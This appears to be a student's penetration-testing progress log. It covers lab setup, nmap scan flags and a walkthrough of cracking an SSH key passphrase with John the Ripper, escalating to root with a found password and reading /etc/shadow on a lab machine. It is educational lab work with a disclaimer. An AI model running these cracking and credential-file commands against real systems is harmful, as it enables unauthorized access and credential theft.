# 🛡️ Cybersecurity Progress Log

This repository documents my ongoing journey into **ethical hacking, penetration testing, and cybersecurity fundamentals**.  
It serves as a structured record of my practical activities, tools explored, and skills developed — with each entry focusing on **what was done, why it was done, and the technical knowledge gained**.

---

## 📂 Progress Overview

### Virtual Lab Setup & OS Deployment
- Installed and configured **VirtualBox** for creating isolated virtual environments.
- Deployed **Kali Linux** as the main penetration testing OS.
  - Configured *Bridged Adapter* networking for realistic LAN interaction.
  - Performed system updates (`apt update && apt upgrade`).
  - Verified core tools (Nmap, Hydra, Burp Suite).
- Installed **Debian Linux** as a vulnerable target machine.
  - Configured SSH, FTP, and Apache HTTP services for testing.
  - Verified service availability using `systemctl status`.

---

### Networking & Remote Access
- Established **SSH connectivity** between Kali and Debian.
- Configured **FTP (vsftpd)** with secure settings (anonymous login disabled).
- Performed **network reconnaissance**:
  - Scanned local devices with `arp-scan`.
  - Analyzed IP addressing & subnet masks.
- Verified running services and open ports with:
  - `netstat -tulnp`
  - `ss -tuln`

---

### Practical Lab Workflows
- Simulated penetration testing process:
  - Enumerated open services on Debian from Kali.
  - Tested SSH logins with valid credentials.
  - Transferred files via FTP.
  - Hosted test HTML pages on Apache for vulnerability scanning.
- Started **TryHackMe** beginner penetration testing rooms to apply networking and Linux skills.

---

## 📌 Skills Strengthened
- Virtual machine deployment & configuration.
- Service setup & security hardening (SSH, FTP, HTTP).
- Remote access in controlled lab environments.
- Network scanning & enumeration.
- Hands-on penetration testing workflows.

---

## 🔍 Nmap Scanning & Enumeration

### Overview
- Practiced host discovery, port scanning, and service enumeration.
- Learned differences between TCP, UDP, and stealth-based scans.
- Covered multiple scanning options for detection evasion and in-depth analysis.

### Commands Practiced
- `nmap -p <port>` — Scan specific port  
- `nmap -p- <target>` — Scan all ports (1–65535)  
- `nmap scanme.nmap.org` — Public test scan  
- `nmap -sn <target>` — Ping scan (host discovery)  
- `nmap -Pn <target>` — Skip host discovery  
- `nmap -sS <target>` — SYN (stealth) scan  
- `nmap -sT <target>` — TCP connect scan  
- `nmap -sU <target>` — UDP scan  
- `nmap -sN <target>` — Null scan  
- `nmap -sX <target>` — Xmas scan  
- `nmap -sF <target>` — FIN scan  
- `nmap -F <target>` — Fast scan (common ports)  
- `nmap -sV <target>` — Service/version detection  
- `nmap --traceroute <target>` — Trace route  
- `nmap -o <file>` — Output to file  
- `nmap -sC <target>` — Default scripts  
- `nmap --script <script>` — Specific NSE script  
- `nmap -A <target>` — Aggressive scan  
- `nmap -A --script <script>` — Aggressive + script  
- `nmap --script vuln <target>` — Vulnerability scan  
- `nmap > <file>` — Save output  
- `nmap -oN <file>` — Normal output  
- `nmap -oA <basename>` — All output formats  
- `nmap -oX <file>` — XML output  
- `nmap -oS <file>` — Script kiddie output  
- `nmap -oG <file>` — Grepable output  
- `nmap -v <target>` — Verbose mode  
- `nmap -vv <target>` — Extra verbose mode  

### Key Learnings
- SYN scan is faster and stealthier than TCP connect.
- Null, Xmas, and FIN scans can bypass some firewalls.
- Version detection and NSE scripts help deeper enumeration.
- Aggressive mode gives full detail but increases detection risk.
- Output formats are important for saving results for reporting.

---
## Progress Update

### Linux Command Learning – Continued

Today, I learned and practiced additional Linux networking, scanning, and exploitation commands to expand my penetration testing skills.

- Learned `sudo arp-scan -l` to detect devices on the local network using ARP requests.
- Practiced multiple Nmap output formats:
  - `nmap -oN` (Normal output)
  - `nmap -oA` (All formats: Normal, XML, Grepable)
  - `nmap -oX` (XML output)
  - `nmap -oS` (Script kiddie style output)
  - `nmap -oG` (Grepable output)
- Used verbosity flags:
  - `-v` for verbose output
  - `-vv` for very verbose output
- Reviewed `wc -` for counting words, lines, and characters in output.
- Practiced Nmap options:
  - `-p` to specify ports
  - `-P` for ping scan
  - `-t4` for faster timing
  - `-s` to define scan type
- Tested remote access using `ssh`.
- Learned web and directory scanning tools:
  - `dirb` for discovering hidden web directories
  - `gobuster` for brute forcing directories, files, and DNS subdomains
  - `ffuf` for web fuzzing
- Used `sudo apt-get` for package management.
- Explored exploitation tools:
  - `msfconsole` for launching the Metasploit Framework
  - `wp-info` to gather WordPress site information
  - `getuid` in Metasploit to identify current user privileges.

---
# Penetration Testing Progress – SSH Private Key Crack & Privilege Escalation

This document logs the steps, commands, and outcomes of a penetration test involving an SSH private key crack and privilege escalation on a target machine.

---

## 🛠 Step 1 – Convert SSH Private Key to John Format
We started with a private key file (`kay`) and converted it to a format readable by **John the Ripper**.

```bash
ssh2john kay > kaypass
```

**Result:**  
Created a file `kaypass` containing the hash of the SSH private key.

---

## 🛠 Step 2 – Crack the Passphrase with John the Ripper
We used the **rockyou.txt** wordlist to crack the passphrase.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kaypass
```

**Output:**
```
beeswax          (kay)
```

**Finding:**  
- Passphrase for the key: **beeswax**

---

## 🛠 Step 3 – Set Proper Permissions for the Private Key
SSH requires private keys to have restrictive permissions (600).

```bash
chmod 600 kay
```

---

## 🛠 Step 4 – Connect to Target Machine via SSH
We connected using the cracked passphrase.

```bash
ssh kay@10.0.2.7 -i kay
```

**When prompted for the passphrase:**
```
beeswax
```

**Login Success:**  
We accessed the target as user `kay`.

---

## 🛠 Step 5 – Explore Home Directory
Listed files and found a potential password file.

```bash
ls
cat pass.bak
```

**Finding:**
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

---

## 🛠 Step 6 – Privilege Escalation to Root
We attempted `sudo su` and used the found password.

```bash
sudo su
```

**Password:**  
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

**Success:**  
We obtained a root shell.

---

## 🛠 Step 7 – Access `/etc/shadow`
As root, we retrieved the contents of the `/etc/shadow` file for further exploitation.

```bash
cat /etc/shadow
```

**Finding:**  
Obtained password hashes for all system users, including `root`, `kay`, and `jan`.

---

## 📌 Summary of Findings
- **SSH Key Passphrase:** `beeswax`
- **User Password (kay):** `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
- **Root Access:** Achieved via `sudo su` using `kay`'s password.
- **Sensitive Files Accessed:** `/etc/shadow`

---

## ⚠️ Disclaimer
This activity was performed in a controlled lab environment for educational purposes only.  
Unauthorized access to computer systems is illegal.





_This log is continuously updated as part of my training at **Red Team Hacker Academy** and personal self-directed lab work._
